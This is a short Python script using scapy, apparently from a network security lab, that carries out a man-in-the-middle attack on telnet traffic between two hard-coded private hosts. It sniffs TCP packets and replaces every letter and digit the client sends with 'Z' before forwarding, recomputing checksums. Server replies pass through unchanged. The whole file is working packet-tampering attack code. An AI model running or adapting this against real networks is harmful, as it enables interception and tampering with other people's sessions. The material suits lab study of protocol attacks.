#!/usr/bin/env python3

from scapy.all import *
#program to conduct mitm attack on telnet protocol between client and server
#client vars for ip and mac
ip_client = "10.1.1.12"
mac_client = "08:00:27:02:0a:81"
#server vars for ip and mac
ip_serv = "10.1.1.11"
mac_serv = "08:00:26:09:fd:f7"

def spoof_pkt(pkt):
    #if the packet's src ip is the client and the dst is the server
    if pkt[IP].src == ip_client and pkt[IP].dst == ip_serv:
	#craft a new packet
        new_pkt = IP(bytes(pkt[IP]))
        #delete old ip checksum
        del(new_pkt.chksum)
        #delete the original payload
        del(new_pkt[TCP].payload)
        #delete the tcp checksum
        del(new_pkt[TCP].chksum)
        
        #if a tcp dg exists in the ip packet change it
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            new_data = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())
            #send the new packet
            print(new_data)
            send(new_pkt/new_data)
        else:
            send(new_pkt)
    #if the packet's src is the server and the dst is the client
    
    elif pkt[IP].src == ip_serv and pkt[IP].dst == ip_client:
        #dont change anything, but need to recalc checksums
        new_pkt = IP(bytes(pkt[IP]))
        del(new_pkt.chksum)
        del(new_pkt[TCP].chksum)
        #send the packet
        send(new_pkt)
        
    
#set the sniff template for ethernet frames matching either the client or the server's
#NOTE This template is not functioning correctly. 
""" 
template = 'tcp and (ether src {client} or ether src {serv})'
#set the filter
sniff_filter = template.format(client=mac_client, serv=mac_serv)
"""
#start the sniffer
pkt = sniff(iface='enp0s3', filter='tcp', prn= spoof_pkt)



